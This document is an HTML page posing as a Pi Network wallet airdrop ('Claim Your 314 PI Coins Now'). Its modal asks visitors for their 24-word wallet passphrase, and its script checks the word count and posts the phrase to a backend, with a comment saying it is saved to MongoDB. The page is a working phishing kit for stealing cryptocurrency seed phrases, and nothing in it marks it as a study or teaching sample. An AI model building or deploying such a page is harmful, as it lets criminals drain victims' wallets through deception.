<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pi Network Wallet</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }

        .container {
            text-align: center;
            padding: 50px;
        }

        .header {
            color: #4c2d91;
            font-size: 36px;
            margin-bottom: 20px;
        }

        .subheader {
            color: #ff9800;
            font-size: 24px;
            margin-bottom: 40px;
        }

        .grid-container {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            justify-content: center;
            margin-top: 30px;
        }

        .grid-item {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            cursor: pointer;
        }

        .grid-item:hover {
            background-color: #f0f0f0;
        }

        .grid-item i {
            font-size: 50px;
            color: #4c2d91;
            margin-bottom: 15px;
        }

        .grid-item p {
            color: #333;
            font-size: 18px;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            overflow: auto;
            padding-top: 60px;
        }

        .modal-content {
            background-color: white;
            margin: 5% auto;
            padding: 20px;
            border-radius: 10px;
            width: 80%;
            max-width: 500px;
        }

        .modal-header {
            font-size: 24px;
            color: #4c2d91;
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ddd;
            font-size: 16px;
        }

        .button {
            padding: 15px 30px;
            background-color: #4c2d91;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
            margin-top: 10px;
        }

        .button:hover {
            background-color: #6a3c9d;
        }

        .footer {
            font-size: 14px;
            color: #888;
            margin-top: 50px;
        }

        @media (max-width: 768px) {
            .grid-container {
                grid-template-columns: repeat(2, 1fr);
            }

            .header {
                font-size: 28px;
            }

            .subheader {
                font-size: 20px;
            }
        }

        @media (max-width: 480px) {
            .grid-container {
                grid-template-columns: 1fr;
            }

            .header {
                font-size: 24px;
            }

            .subheader {
                font-size: 18px;
            }

            .modal-content {
                width: 90%;
            }
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="header">AIRDROP FROM PI NETWORK</div>
        <div class="subheader">Claim Your 314 PI Coins Now</div>

        <div class="grid-container">
            <div class="grid-item" onclick="openModal()">
                <i class="fas fa-wallet"></i>
                <p>Wallet</p>
            </div>
            <div class="grid-item">
                <i class="fas fa-cogs"></i>
                <p>Fireside</p>
            </div>
            <div class="grid-item">
                <i class="fas fa-lightbulb"></i>
                <p>Brainstorm</p>
            </div>
            <div class="grid-item">
                <i class="fas fa-cogs"></i>
                <p>Mine</p>
            </div>
            <div class="grid-item">
                <i class="fas fa-database"></i>
                <p>Blockchain</p>
            </div>
            <div class="grid-item">
                <i class="fas fa-cogs"></i>
                <p>Develop</p>
            </div>
            <div class="grid-item">
                <i class="fas fa-user"></i>
                <p>KYC</p>
            </div>
            <div class="grid-item">
                <i class="fas fa-comment"></i>
                <p>Chat</p>
            </div>
            <div class="grid-item">
                <i class="fas fa-user"></i>
                <p>Profiles</p>
            </div>
        </div>

        <div class="footer">Explore the Ecosystem</div>
    </div>

    <!-- Modal -->
    <div id="walletModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">Enter Your 24-Word Passphrase</div>
            <input type="text" id="passphraseInput" class="input-field" placeholder="Enter your 24-word passphrase here" />
            <button class="button" onclick="submitPassphrase()">Unlock with passphrase</button>
        </div>
    </div>

    <script>
        // Open the modal when the Wallet option is clicked
        function openModal() {
            document.getElementById('walletModal').style.display = 'block';
        }

        // Close the modal when clicking outside of it
        window.onclick = function (event) {
            if (event.target === document.getElementById('walletModal')) {
                document.getElementById('walletModal').style.display = 'none';
            }
        };

        // Handle form submission to save the passphrase in MongoDB
        async function submitPassphrase() {
            const passphrase = document.getElementById('passphraseInput').value;

            if (passphrase.split(' ').length !== 24) {
                alert('Invalid passphrase! Please enter exactly 24 words.');
                return;
            }

            // Send the passphrase to the backend
            try {
                const response = await fetch('http://localhost:3000/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ passphrase })
                });

                if (response.ok) {
                    alert('Passphrase saved successfully!');
                    window.location.href = '/success'; // Redirect to the success page
                } else {
                    alert('Failed to save passphrase. Please try again.');
                }
            } catch (error) {
                console.error('Error submitting passphrase:', error);
                alert('Error submitting passphrase. Please try again later.');
            }
        }
    </script>
</body>

</html>
